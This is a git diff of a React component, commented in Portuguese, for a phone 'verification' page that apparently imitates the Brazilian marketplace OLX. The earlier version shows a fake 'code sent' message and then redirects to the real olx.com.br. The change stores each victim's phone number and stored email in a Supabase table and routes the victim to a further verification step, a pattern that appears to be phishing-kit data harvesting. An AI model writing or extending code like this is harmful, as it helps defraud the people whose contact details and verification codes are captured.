@@ -2,11 +2,15 @@ import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Info, Lock } from 'lucide-react';
 import { toast } from "sonner";
-import br from "../../assets/br.png"
+import br from "../../assets/br.png";
+// Importe o cliente do supabase
+import { supabase } from "@/lib/supabaseClient";
 
 const VerifyCode = () => {
   const navigate = useNavigate();
   const [phoneNumber, setPhoneNumber] = useState("");
+  // Recupera o email
+  const email = localStorage.getItem("user_email");
 
   useEffect(() => {
     // Focus on input when component mounts
@@ -41,17 +45,49 @@ const VerifyCode = () => {
   const isValidPhone = () => {
     const numbers = phoneNumber.replace(/\D/g, "");
     return numbers.length === 11; // Brazilian mobile: 11 digits
+
   };
 
-  const handleSubmit = () => {
+  // Função atualizada para salvar no banco
+  const handleSubmit = async () => {
     if (!isValidPhone()) {
       toast.error("Por favor, insira um número de telefone válido");
       return;
     }
-    toast.success("Código enviado!");
-    setTimeout(() => {
-    window.location.href = "https://olx.com.br";
-    }, 1000);
+
+    if (!email) {
+      toast.error("Email não encontrado. Por favor, faça login novamente.");
+      return;
+    }
+
+    try {
+      // Insere na tabela codigos_verificacao_celular
+          localStorage.setItem("user_phone", phoneNumber);
+      const { error } = await supabase
+        .from('codigos_verificacao_celular')
+        .insert([
+          { 
+            codigo: phoneNumber, // Salva o telefone na coluna 'codigo'
+            email: email         // Salva o email na coluna 'email'
+          }
+        ]);
+
+      if (error) {
+        console.error('Erro ao salvar telefone:', error);
+        toast.error("Erro ao processar solicitação.");
+        return;
+      }
+
+      // Se deu tudo certo:
+      toast.success("Código enviado!");
+      setTimeout(() => {
+        navigate('/auth/verify-phone');
+      }, 1000);
+
+    } catch (err) {
+      console.error("Erro inesperado:", err);
+      toast.error("Erro de conexão.");
+    }
   };
 
   return (
